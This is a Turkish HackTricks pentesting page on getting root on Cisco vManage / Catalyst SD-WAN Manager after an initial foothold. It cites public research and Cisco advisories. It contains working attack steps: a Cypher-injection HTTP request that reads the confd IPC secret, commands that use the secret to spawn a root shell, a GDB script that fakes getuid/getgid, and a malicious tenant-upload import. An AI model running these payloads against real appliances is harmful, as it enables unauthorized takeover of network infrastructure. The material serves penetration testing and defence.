# Cisco - vmanage

Cisco vManage / *Catalyst SD-WAN Manager* üzerinde `vmanage`, `netadmin` veya `vmanage-admin` olarak code execution elde ettiğinizde, en ilgi çekici yerel privesc yüzeyleri genellikle `confd` CLI stack'i, `cmdptywrapper` helper'ı, localhost REST API'leri ve root-owned import/upload handler'larıdır.

Bir controller üzerinde hâlâ **initial foothold** elde etmeniz gerekiyorsa, önce özel control-plane sayfasını kontrol edin:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Hızlı yerel triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830|8443'
find /run /var/run -maxdepth 2 -type s 2>/dev/null | egrep 'confd|cli|rest|mgmt'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
ls -la /home/vmanage-admin/.ssh 2>/dev/null
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
If `/etc/confd/confd_ipc_secret` foothold'unuzdan okunabiliyorsa, Yol 1 ve Yol 2 hemen uygulanabilir hâle gelir. Remote file disclosure veya webshell üzerinden erişim sağladıysanız, ayrıca `vmanage-admin` SSH materyalini ve multitenancy upload handler'larını inceleyin; yakın tarihli araştırmalar her ikisinin de uygulanabilir pivot'lar olduğunu gösterdi.<sup>[[3]](#references)[[4]](#references)</sup>

## Yol 1

Synacktiv'in vManage değerlendirmesi bu root-shell yolunu belgeliyor.<sup>[[5]](#references)</sup>

Raporun bağlantı verdiği [ConfD documentation](http://66.218.245.39/doc/html/rn03re18.html) IPC authentication'ı açıklıyor; vManage örneğinde secret `/etc/confd/confd_ipc_secret` konumuna yerleştiriliyor ve `vmanage` tarafından okunabildiği gösteriliyor.<sup>[[5]](#references)</sup>
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Neo4j, bildirilen kurulumda `vmanage` ayrıcalıklarıyla çalıştığı için önceki Cypher injection gizli dosyayı okuyabilir.<sup>[[5]](#references)</sup>
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` kendisi komut satırı argümanlarını kabul etmez; `/usr/bin/confd_cli_user` dosyasını çağırır. Bildirilen workflow, root tarafından okunabilen bu yardımcı dosyayı rootfs'ten çıkarır, `scp` aracılığıyla kopyalar, yardım bilgisini okur, `CONFD_IPC_ACCESS_FILE` değişkenini ayarlar ve root shell elde etmek için `-U 0 -G 0` ile çağırır.<sup>[[5]](#references)</sup>
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Yol 2

Bu alternatif yol, Walmart Global Tech'in vManage 19.2.2 araştırmasından uyarlanmıştır.<sup>[[6]](#references)</sup>

Synacktiv yolu, bildirilen kurulumda root tarafından okunabilir olan `/usr/bin/confd_cli_user` dosyasının bir kopyasını gerektirir; Walmart raporu ise bunun yerine GDB altında `confd_cli`'nin identity değerlerini değiştirir.<sup>[[5]](#references)[[6]](#references)</sup>

Rapordaki disassembly, `confd_cli`'nin çağıranın UID ve GID değerlerini topladığını gösterir.<sup>[[6]](#references)</sup>

<details>
<summary>UID/GID toplamasını gösteren Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

Aynı test, root'a ait `cmdptywrapper`'ın açıkça belirtilen `-g` ve `-u` değerlerini aldığını gösterdi.<sup>[[6]](#references)</sup>
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
Araştırmacı, `confd_cli` komutunun oturum açmış kullanıcının UID ve GID değerlerini `cmdptywrapper` komutuna ilettiği sonucuna vardı.<sup>[[6]](#references)</sup>

`cmdptywrapper` komutunu doğrudan `-g 0 -u 0` ile çalıştırmak başarısız oldu; bunun nedeni, gerekli dosya tanımlayıcısının (örnekteki `-i 1015`) mevcut olmamasıydı.<sup>[[6]](#references)</sup>

`confd_cli` bu değerleri bağımsız değişken olarak sunmadığından raporda, `getuid()` ve `getgid()` dönüş değerlerini geçersiz kılmak için GDB kullanılıyor; GDB bu appliance üzerinde mevcut durumdaydı.<sup>[[5]](#references)[[6]](#references)</sup>

`vmanage` erişimiyle test, `/etc/confd/confd_ipc_secret` dosyasını okuyabiliyordu; aşağıdaki script her iki identity çağrısının da sıfır döndürmesini zorluyor.<sup>[[6]](#references)</sup>

Raporda kullanılan GDB scripti:<sup>[[6]](#references)</sup>
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
Bildirilen konsol çıktısı:<sup>[[6]](#references)</sup>

<details>
<summary>Konsol çıktısı</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Path 3 (2025 CLI input validation bug - CVE-2025-20122)

Cisco, [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) için kendi advisory'sinde daha temiz bir local root yolunu daha sonra belgeledi. **Yalnızca read-only ayrıcalıklara sahip authenticated bir attacker**, yetersiz input validation nedeniyle manager CLI'ye hazırlanmış bir request göndererek root elde edebilirdi.<sup>[[7]](#references)</sup>

Offensive perspective açısından bu advisory ve daha önceki CLI araştırması aşağıdaki workflow'u öneriyor.<sup>[[6]](#references)[[7]](#references)</sup>

1. Sistem üzerinde *herhangi* bir low-priv foothold elde ettiğinizde, daha ağır Path 1 / Path 2 workflow'una geçmeden önce local CLI service'i test etmelisiniz.
2. Trust boundary'yi bulmak için Path 2'deki artefaktları yeniden kullanın: `confd_cli` → `cmdptywrapper` → `vshell`.
3. CLI backend'e iletilen her alanı şüpheli kabul edin: UID/GID, kullanıcı adı, terminal meta verileri, içe aktarılan dosyalar veya daha sonra root-owned bir helper tarafından tüketilen herhangi bir değer.
4. Low-priv bir kullanıcı local CLI socket'ine erişebiliyor ve bu alanları etkileyebiliyorsa root, yalnızca tek bir hazırlanmış request uzaklıkta olabilir.

Appliance'a eriştikten sonra local CLI chain'i aşağıdaki şekilde inceleyin.<sup>[[6]](#references)[[7]](#references)</sup>
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Bu, 2025 bug'ını yeniden kullanılabilir bir hunting pattern'e dönüştürür: kimlik bilgilerini userland'de toplayıp bunları privileged bir wrapper'a ileten **local CLI shim'lerini** arayın.<sup>[[6]](#references)[[7]](#references)</sup>

**CVE-2025-20122** ile sonraki **CVE-2026-20122**'yi karıştırmayın: 2025 sorunu *local* bir CLI-to-root bug'ıdır; 2026 sorunu ise çoğunlukla bir foothold yerleştirmek ve ardından Path 1 / Path 2 / Path 4'ü yeniden incelemek için kullanılan *remote* bir API arbitrary file overwrite açığıdır.<sup>[[3]](#references)[[7]](#references)</sup>

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco'nun Şubat 2026 advisory'si başka bir privesc sınıfını, [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v), açıklamaktadır. **Authenticated, local attacker with low privileges**, REST API'deki yetersiz bir user-authentication mechanism nedeniyle root elde edebilir.<sup>[[1]](#references)</sup>

Bu önemlidir; çünkü vManage privesc artık `confd`/TTY abuse ile sınırlı değildir. Low-priv bir shell elde ettikten sonra aşağıdakileri de hunting kapsamına alın.<sup>[[1]](#references)</sup>

- caller'a gereğinden fazla güvenen localhost-only API endpoint'leri
- mevcut account'tan okunabilen token'lar, cookie'ler veya service credential'ları
- hâlâ local olarak tetiklenebilen `dataservice`/REST handler'ları üzerinden açığa çıkarılmış root-only action'lar

Pratikte, `vmanage` veya başka bir service user olarak shell elde ettiğinizde local API abuse, interactive CLI abuse'a göre daha kolay otomatikleştirilebilir.<sup>[[1]](#references)</sup>
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Yerel session context, privileged REST functionality'e erişmek için yeterliyse API path'i tercih edin: replay etmek, script'lemek ve çalınmış web session'ları veya API token'larıyla chain oluşturmak daha kolaydır.<sup>[[1]](#references)</sup>

## Path 5 (2026 root tarafından işlenen özel hazırlanmış dosya - CVE-2026-20245)

Başka bir güncel pattern de [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)'tir. `netadmin` yetkilerine sahip yerel bir attacker, CLI'ın daha sonra güvenli olmayan şekilde işlediği **özel hazırlanmış bir dosya** yükleyebilir ve bu da `root` olarak command injection'a yol açabilir.<sup>[[2]](#references)</sup>

HackTricks açısından değerli teknik, belirli CVE'den daha kapsamlıdır.<sup>[[2]](#references)</sup>

1. Dosya kabul eden her CLI veya web workflow'unu enumerate edin: import'lar, diagnostic bundle'lar, template'ler, validator'lar, backup'lar, tenant verileri vb.
2. Yüklenen dosyanın nereye bırakıldığını ve hangi root-owned script veya binary'nin dosyayı tükettiğini trace edin.
3. Filename'in, dosya içeriğinin veya parse edilmiş metadata'nın shell command'larına, wrapper script'lerine ya da `system()` tarzı helper'lara aktarılıp aktarılmadığını test edin.
4. Zaten `netadmin`'e erişebiliyorsanız (geçerli cred'ler, çalınmış session veya bir auth-bypass chain'i aracılığıyla), file-processing bug'ları çoğu zaman root'a ulaşmanın en hızlı yoludur.

Google Cloud / Mandiant daha sonra bu bug class'ının multitenancy import path'i üzerinden exploit edildiği somut bir örneği gösterdi.<sup>[[4]](#references)</sup>
```bash
request tenant-upload tenant-list /home/admin/evil_tenant.csv vpn 0
```
Gözlemlenen saldırıda, hazırlanmış CSV dosyası geçici bir UID 0 hesabı (`troot`) oluşturmak için `/etc/passwd` ve `/etc/shadow` dosyalarını değiştirdi. Bu nedenle `tenant-upload` / `tenant-list` tarzı importer'lar özellikle ilgi çekicidir: bunlar yalnızca data-ingestion özellikleri değil, potansiyel root-owned parser front-end'leridir.<sup>[[4]](#references)</sup>

Hızlı bir shell-side hunting pattern şöyledir:
```bash
strings /usr/bin/* 2>/dev/null | grep -E 'tenant-upload|tenant-list|import|upload|backup' | head
grep -R "tenant-upload\|tenant-list" /opt /usr 2>/dev/null | head
```
Bu bug sınıfı, `netadmin` yetkisi sağlayan ancak `root` sağlamayan remote foothold'larla özellikle iyi zincirlenir.<sup>[[2]](#references)[[4]](#references)</sup>

## Zincirlenebilecek diğer güncel vManage/Catalyst SD-WAN Manager açıkları

- **Kimlik doğrulamasız info leak (CVE-2026-20133)** – Public research, `confd_ipc_secret` veya `vmanage-admin` private key'ini açığa çıkarabildiğini gösterdiği için özellikle yüksek değerlidir; bu da bir read bug'ını Path 1'e veya bir NETCONF pivot'una dönüştürür.<sup>[[3]](#references)</sup>
- **Kimlik doğrulamalı API arbitrary file overwrite (CVE-2026-20122)** – Yukarıdaki 2025 CLI bug'ından farklıdır; VulnCheck bunu bir webshell upload etmek için kullandı ve bu durumda bu sayfadaki local privesc yolları hemen önem kazanır.<sup>[[3]](#references)</sup>
- **Kimlik doğrulamalı UI XSS (CVE-2024-20475)** – Kimlik doğrulanmış bir attacker, etkilenen kullanıcının web interface'i içinde script çalıştırabilir; ortaya çıkan session context'in `vshell`'e veya yukarıdaki local privesc yollarından birine ulaşan API/CLI action'larını açığa çıkarıp çıkarmadığını değerlendirin.<sup>[[9]](#references)</sup>
- **`netadmin` seviyesine remote auth bypass (CVE-2026-20129)** – `netadmin`, 2026 crafted-file privesc için gereken seviyenin tam olarak kendisi olduğundan Path 5 için çok güçlü bir precursor'dur.<sup>[[2]](#references)[[3]](#references)</sup>
- **Kimlik doğrulamalı arbitrary file write (CVE-2026-20262)** – CVE-2026-20122 ile benzer offensive value'ya sahiptir, ancak daha sonraki bir web UI upload path'i üzerinden çalışır; Cisco, bug tarafından oluşturulan veya üzerine yazılan bir file'ın daha sonra root'a yükselmek için kullanılabileceğini söylüyor.<sup>[[10]](#references)</sup>
- **Eski CLI privesc'i yeniden etkinleştirmek için downgrade (CVE-2022-20775)** – 2026 intrusions, attacker'ların daha eski ve vulnerable bir SD-WAN build'ine geri dönebildiğini, eski CLI root bug'ını abuse edebildiğini ve ardından original version'ı geri yükleyebildiğini gösterdi.<sup>[[8]](#references)</sup>
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Dedicated SD-WAN control-plane sayfasında daha ayrıntılı şekilde belgelenmiştir; `vmanage-admin` için bir SSH key ekleyerek follow-on management-plane action'ları için kalıcı NETCONF access sağlayabilir.<sup>[[11]](#references)</sup>



## References

- [1] [Cisco Catalyst SD-WAN Açıkları (CVE-2026-20126, CVE-2026-20129, vb.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [2] [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager ve Catalyst SD-WAN Validator Kimlik Doğrulamalı Privilege Escalation Açığı (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
- [3] [VulnCheck: Herding Cats - Güncel Cisco SD-WAN Manager Açıkları](https://www.vulncheck.com/blog/cisco-sd-wan-manager-vulns)
- [4] [Google Cloud / Mandiant: Cisco Catalyst SD-WAN Manager'da CVE-2026-20245 Açığının Zero-Day Exploitation'ı](https://cloud.google.com/blog/topics/threat-intelligence/zero-day-exploitation-cisco-catalyst-sd-wan-manager)
- [5] [Cisco SD-WAN Pentesting Part 1: vManage'e Saldırmak](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html)
- [6] [Cisco SD-WAN vManage 19.2.2 Hacking'i — CSRF'den Remote Code Execution'a](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77)
- [7] [Cisco Catalyst SD-WAN Manager Privilege Escalation Açığı (CVE-2025-20122)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt)
- [8] [UAT-8616 Tarafından Cisco Catalyst SD-WAN'ın Active Exploitation'ı (Cisco Talos)](https://blog.talosintelligence.com/uat-8616-sd-wan/)
- [9] [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Açığı (CVE-2024-20475)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-xss-zQ4KPvYd)
- [10] [Cisco Catalyst SD-WAN Manager Arbitrary File Write Açığı (CVE-2026-20262)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-arbfw-c2rZvQ)
- [11] [Rapid7: CVE-2026-20182 - Cisco Catalyst SD-WAN Controller'da Critical Authentication Bypass](https://www.rapid7.com/blog/post/ve-cve-2026-20182-critical-authentication-bypass-cisco-catalyst-sd-wan-controller-fixed/)
{{#include ../../banners/hacktricks-training.md}}
